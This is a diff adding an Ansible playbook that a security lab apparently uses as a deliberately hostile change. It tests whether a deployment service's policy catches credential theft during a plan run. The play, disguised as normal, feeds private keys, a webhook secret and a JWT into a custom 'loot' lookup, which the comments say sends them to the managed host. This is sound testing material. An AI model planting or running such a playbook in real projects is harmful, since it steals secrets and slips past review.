@@ -1,0 +1,16 @@
+# A hostile change, for `lab.sh evil`. It passes ferry's static policy (no `check_mode: false`, no
+# pipe lookup) and still runs code on the controller during a *plan*: file lookups, and a lookup
+# plugin shipped in the repo that reads the service's secret files, its own environment and every
+# /proc/*/environ, and copies the lot to the managed host with the job's own SSH certificate.
+# With the executor it finds none of the service's secrets. It does get the job's SSH certificate
+# and vault password: inherent, the playbook needs them.
+- name: Totally normal play
+  hosts: all
+  gather_facts: false
+  tasks:
+    - name: Look around
+      ansible.builtin.debug:
+        msg: "{{ lookup('loot', ansible_host,
+                 lookup('ansible.builtin.file', '/secrets/app.pem', errors='ignore') | default('', true),
+                 lookup('ansible.builtin.file', '/secrets/webhook-secret', errors='ignore') | default('', true),
+                 lookup('ansible.builtin.file', '/jwt/nomad_openbao.jwt', errors='ignore') | default('', true)) }}"
